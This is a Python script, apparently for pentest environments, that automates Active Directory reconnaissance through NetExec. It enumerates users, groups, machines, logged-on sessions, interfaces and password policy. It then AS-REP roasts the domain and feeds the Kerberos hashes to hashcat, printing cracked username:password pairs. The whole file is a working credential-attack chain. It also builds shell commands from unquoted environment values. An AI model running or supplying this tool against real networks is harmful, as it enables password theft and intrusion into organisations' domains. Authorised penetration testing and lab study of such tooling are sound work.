#!/usr/bin/env python3
import os
import subprocess
import sys
import argparse
import re
import shutil
import site
from collections import defaultdict

def install_termcolor_if_missing():
    try:
        import termcolor
    except ImportError:
        print("[termcolor]: Module manquant. Installation en cours...")
        subprocess.run([sys.executable, "-m", "pip", "install", "termcolor"], check=True)
        site.main()  # recharge les chemins

def install_glow_if_missing():
    install_dir = "/opt/tools/glow"
    binary_path = os.path.join(install_dir, "glow")
    symlink_path = "/usr/local/bin/glow"

    if shutil.which("glow"):
        return

    if os.path.exists(binary_path):
        print("[Glow]: Binaire trouvé localement, création du lien symbolique...")
        try:
            subprocess.run(["ln", "-sf", binary_path, symlink_path], check=True)
            print("[Glow]: Glow est maintenant disponible dans le PATH.")
        except Exception as e:
            print("[Glow]: Erreur lors de la création du lien symbolique :", e)
        return

    print("[Glow]: Glow n'est pas installé. Téléchargement et installation...")

    try:
        subprocess.run(["git", "clone", "https://github.com/charmbracelet/glow.git", install_dir], check=True)
        subprocess.run(["go", "build"], cwd=install_dir, check=True)

        if os.path.exists(binary_path):
            subprocess.run(["ln", "-sf", binary_path, symlink_path], check=True)
            print("[Glow]: Installation réussie !")
        else:
            print("[Glow]: Compilation terminée mais binaire introuvable.")
            sys.exit(1)

    except subprocess.CalledProcessError as e:
        print(f"[Glow]: Erreur lors de l'installation : {e}")
        sys.exit(1)
    except Exception as e:
        print(f"[Glow]: Une erreur inattendue s'est produite : {e}")
        sys.exit(1)

install_termcolor_if_missing()
from termcolor import colored

def check_env_vars():
    env = {}
    for var in ["IP", "USER", "PASSWORD"]:
        env[var] = os.getenv(var)
    return env

def banner():
    print()
    print(colored("╔" + "═"*58 + "╗", "cyan"))
    print(colored("║       🔍 GetInfoAD - Active Directory (with NXC)        ║", "green", attrs=["bold"]))
    print(colored("╚" + "═"*58 + "╝", "cyan"))
    print()

def show_env(env):
    print(colored("🌐 Environment variables:", "yellow", attrs=["bold"]))
    for key, value in env.items():
        if value:
            display = colored("✅", "green") + f" {key} = " + colored(value, "cyan")
        else:
            display = colored("❌", "red") + f" {key} is not set"
        print("   " + display)
    print()

def run_command(command):
    try:
        result = subprocess.run(command, shell=True, executable="/bin/bash", check=True, capture_output=True, text=True)
        return result.stdout.strip().splitlines()
    except subprocess.CalledProcessError as e:
        print(colored(f"❌ Command failed: {command}", "red"))
        print(colored(e.stderr.strip(), "red"))
        return []

def ask_to_save(data, default_name):
    choice = input(colored("\n📂 Do you want to save this list to a file? (y/n) > ", "yellow")).strip().lower()
    if choice == "y":
        filename = input(colored(f"📝 Enter filename (default: {default_name}) > ", "cyan")).strip()
        filename = filename if filename else default_name
        try:
            with open(filename, "w") as f:
                f.write("\n".join(data) + "\n")
            print(colored(f"✅ Successfully saved to: {filename}", "green", attrs=["bold"]))
        except Exception as e:
            print(colored("❌ Error while saving:", "red"), e)
    else:
        print(colored("📬 List not saved.", "yellow"))

def get_users():
    command = '''nxc ldap $IP -u $USER -p $PASSWORD --users'''
    print(colored("▶️  Retrieving domain users...", "cyan"))
    lines = run_command(command)
    users = []
    for line in lines:
        if (
            line.startswith("LDAP")
            and not any(excl in line for excl in [
                "-Username-", "krbtgt", "Guest", "DefaultAccount",
                "WDAGUtilityAccount", "[+]", "[*]"
            ])
        ):
            parts = line.split()
            if len(parts) >= 5:
                users.append(parts[4])
    return sorted(set(users))




def get_machines(with_versions=False):
    command = '''nxc smb $IP -u $USER -p $PASSWORD'''
    print(colored("▶️  Retrieving computeurs...", "cyan"))
    lines = run_command(command)
    hosts = {}
    for line in lines:
        match_name = re.search(r'\(name:([^)]+)\)', line)
        if match_name:
            hostname = match_name.group(1).strip()
            if with_versions:
                os_match = re.search(r'\[\*\] (.*?) \(name:', line)
                os_info = os_match.group(1).strip() if os_match else "Unknown OS"
                hosts[hostname] = os_info
            else:
                hosts[hostname] = None
    return hosts

def get_groups():
    command = '''nxc ldap $IP -u $USER -p $PASSWORD --groups'''
    print(colored("▶️  Retrieving domain groups...", "cyan"))
    lines = run_command(command)
    groups = []
    for line in lines:
        match = re.search(r'\s+DC01\s+(.*?)\s+membercount', line)
        if match:
            group = match.group(1).strip()
            if group:
                groups.append(group)
    return sorted(set(groups))

def get_loggedon_users():
    command = '''nxc smb $IP -u $USER -p $PASSWORD --loggedon-users'''
    print(colored("▶️  Retrieving logged-on users...", "cyan"))
    lines = run_command(command)
    sessions = defaultdict(lambda: {"ip": "", "users": []})
    for line in lines:
        match_host = re.match(r'^SMB\s+(\S+)\s+\d+\s+(\S+)', line)
        if match_host:
            ip = match_host.group(1)
            host = match_host.group(2)
            sessions[host]["ip"] = ip
        match_user = re.search(r'(\\\\|\s)([\w.-]+\\[\w.-]+)\s+logon_server', line)
        if match_user:
            user = match_user.group(2).strip()
            host = line.split()[3]
            if user not in sessions[host]["users"]:
                sessions[host]["users"].append(user)
    return dict(sessions)

def get_interfaces():
    command = '''nxc smb $IP -u $USER -p $PASSWORD --interfaces'''
    print(colored("▶️  Retrieving network interfaces...", "cyan"))
    lines = run_command(command)
    parsed = []
    seen = set()
    for line in lines:
        match = re.search(r'(Ethernet\d+)\s+\|\s+([\d.]+)\s+\|\s+(.*?)\s+\|\s+(.*?)\s+\|\s+(True|False)', line)
        if match:
            entry = f"{match.group(1)} - {match.group(2)}  | Mask: {match.group(3)}  | Gateway: {match.group(4)}  | DHCP: {match.group(5)}"
            if entry not in seen:
                parsed.append(entry)
                seen.add(entry)
    return parsed

def get_passpol():
    command = '''nxc smb $IP -u $USER -p $PASSWORD --pass-pol'''
    print(colored("▶️  Retrieving password policy...", "cyan"))
    lines = run_command(command)
    filtered = []
    seen = set()
    for line in lines:
        clean = re.sub(r'^SMB\s+\S+\s+\d+\s+\S+\s+', '', line).strip()
        if clean.startswith("[+]"):
            continue
        if any(keyword in clean.lower() for keyword in ["password", "lockout", "complex", "minimum", "maximum", "reset", "threshold"]):
            if clean not in seen:
                filtered.append(clean)
                seen.add(clean)
    return filtered

def get_domain_name():
    command = '''nxc smb $IP -u $USER -p $PASSWORD'''
    result = run_command(command)
    for line in result:
        match = re.search(r'\(domain:([^)]+)\)', line)
        if match:
            return match.group(1).strip()
    return "UnknownDomain.local"

def get_asreproast(users):
    print(colored("▶️  Performing AS-REP Roasting using user list...", "cyan"))

    users_file = "userdomaine.txt"
    output_file = "asreproast_output.txt"

    # Écrire proprement la liste des utilisateurs
    try:
        with open(users_file, "w") as f:
            f.write("\n".join(users) + "\n")
    except Exception as e:
        print(colored("❌ Failed to write user list:", "red"), e)
        return []

    # Lancer la commande NXC
    command = f"nxc ldap $IP -u {users_file} -p '' --asreproast {output_file}"
    run_command(command)

    # Vérifier que le fichier est bien généré
    if not os.path.exists(output_file) or os.path.getsize(output_file) == 0:
        print(colored("❌ AS-REP output file not found or empty.", "red"))
        return []

    # Lire les hashs, filtrer doublons
    try:
        with open(output_file, "r") as f:
            hashes = set(line.strip() for line in f if "$krb5asrep$" in line)
        with open(output_file, "w") as f:
            for h in sorted(hashes):
                f.write(h + "\n")
        return sorted(hashes)
    except Exception as e:
        print(colored("❌ Failed to process AS-REP hashes:", "red"), e)
        return []





def full_report():
    domain = get_domain_name()
    print(colored(f"📘 Generating report for domain {domain}...", "cyan"))

    users = get_users()
    machines = get_machines()
    machines_os = get_machines(with_versions=True)
    groups = get_groups()
    loggedon = get_loggedon_users()
    interfaces = get_interfaces()
    passpol = get_passpol()
    asreproast = get_asreproast(users)


    md = []
    md.append(f"# Active Directory Report - {domain}\n")

    if users:
        md.append("## 👤 Domain Users\n")
        md.extend(users)
        md.append("")

    if groups:
        md.append("## 👥 Domain Groups\n")
        md.extend(groups)
        md.append("")

    if machines:
        md.append("## 💻 Domain Machines\n")
        md.extend(machines.keys())
        md.append("")

    if machines_os:
        md.append("## 📍 Operating Systems\n")
        for host, osinfo in machines_os.items():
            md.append(f"{host}  — {osinfo}")
        md.append("")

    if loggedon:
        md.append("## 👨‍💻 Logged-on Users")
        for host, info in loggedon.items():
            md.append(f"### Logged-on {host} ({info['ip']})")
            if info["users"]:
                for user in info["users"]:
                    md.append(f"- {user}")
            else:
                md.append("_No users currently logged on._")
        md.append("")

    if interfaces:
        md.append("## 🌐 Network Interfaces\n```")
        md.extend(interfaces)
        md.append("```\n")

    if passpol:
        md.append("## 🔐 Password Policy\n```")
        md.extend(passpol)
        md.append("```\n")

    md.append("## 🔥 AS-REP Roasting\n```")
    if asreproast:
        md.extend(asreproast)
    else:
        md.append("No AS-REP roastable account found.")
    md.append("```\n")


    markdown_output = "\n".join(md)
    filename = "report.md"

    try:
        with open(filename, "w") as f:
            f.write(markdown_output + "\n")
        print(colored(f"✅ Report saved to: {filename}", "green", attrs=["bold"]))
        print(colored(f"✨ Opening report...", "magenta"))
        os.system(f"glow {filename}")
        
    except Exception as e:
        print(colored("❌ Error while saving or opening the report:", "red"), e)

    ask_to_save(markdown_output.splitlines(), filename)

def ask_crack_hashes():
    print()
    choice = input(colored("🧨 Do you want to try to crack AS-REP hashes now ? (y/n) > ", "yellow")).strip().lower()
    if choice != "y":
        print(colored("🚫 Skipping hash cracking.", "yellow"))
        return

    print(colored("📂 Select your wordlist...", "cyan"))
    try:
        wordlist_cmd = "find /opt/lists /usr/share/wordlists /usr/share/wfuzz /usr/share/dirb -type f | fzf"
        wordlist = subprocess.check_output(wordlist_cmd, shell=True, text=True).strip()

        if not wordlist:
            print(colored("❌ No wordlist selected (fzf exited).", "red"))
            return

    except subprocess.CalledProcessError:
        print(colored("❌ Failed to launch fzf-wordlists.", "red"))
        return

    hashfile = "asreproast_output.txt"
    if not os.path.isfile(hashfile):
        print(colored(f"❌ Hash file not found: {hashfile}", "red"))
        return

    print(colored(f"🚀 Launching hashcat on {hashfile} using {wordlist}...", "magenta"))
    potfile = "hashcat.potfile"

    try:
        command = f"hashcat {hashfile} {wordlist} --potfile-path {potfile} --quiet --force"
        subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        if not os.path.isfile(potfile):
            print(colored("❌ Potfile not found, no results to show.", "red"))
            return

        cracked = []
        with open(potfile, "r") as f:
            for line in f:
                if "$krb5asrep$" in line:
                    parts = line.strip().split(":")
                    if len(parts) >= 3:
                        match = re.search(r'\$krb5asrep\$23\$(?P<user>[^@]+)@', parts[0])
                        if match:
                            user = match.group("user")
                            password = parts[-1]
                            cracked.append(f"{user}:{password}")

        if cracked:
            print(colored("\n🎉 Cracked credentials (username:password):", "green", attrs=["bold"]))
            for cred in cracked:
                print(colored(cred, "cyan"))
        else:
            print(colored("❌ No hashes cracked.", "red"))

    except Exception as e:
        print(colored("❌ Unexpected error during hashcat execution:", "red"), e)


def main():
    parser = argparse.ArgumentParser(description="Active Directory enumeration via SMB")
    group = parser.add_mutually_exclusive_group()
    group.add_argument("-u", "--users", action="store_true", help="List domain users")
    group.add_argument("-m", "--machines", action="store_true", help="List exposed machine names")
    group.add_argument("-o", "--os", action="store_true", help="List machines with their operating system")
    group.add_argument("-f", "--full", action="store_true", help="Show all info in Markdown format")
    group.add_argument("--groups", action="store_true", help="List domain groups")
    group.add_argument("-a", "--asreprostable", action="store_true", help="Perform AS-REP roasting only")

    args = parser.parse_args()

    if not any(vars(args).values()):
        args.full = True

    install_glow_if_missing()
    banner()
    env = check_env_vars()
    show_env(env)

    if None in env.values():
        print(colored("💡 Please define all required environment variables before running this script.", "yellow", attrs=["bold"]))
        print(colored("Exemple : exegol-history add creds -u 'MyUser' -p 'Password123' ; exegol-history apply creds", "cyan"))
        sys.exit(1)

    if args.users:
        results = get_users()
        print("\n".join(results))
        ask_to_save(results, "users.txt")

    elif args.asreprostable:
        users = get_users()
        results = get_asreproast(users)
        if results:
            print("\n".join(results))
            ask_crack_hashes()
        else:
            print(colored("No AS-REP roastable account found.", "yellow"))
        ask_to_save(results if results else ["No AS-REP roastable account found."], "asreproast.txt")


    elif args.machines:
        results = get_machines()
        print("\n".join(results.keys()))
        ask_to_save(list(results.keys()), "machines.txt")

    elif args.os:
        results = get_machines(with_versions=True)
        output = [f"{host} — {osinfo}" for host, osinfo in results.items()]
        print("\n".join(output))
        ask_to_save(output, "machines_with_os.txt")

    elif args.groups:
        results = get_groups()
        print("\n".join(results))
        ask_to_save(results, "groups.txt")

    elif args.full:
        full_report()
        ask_crack_hashes()

if __name__ == "__main__":
    main()
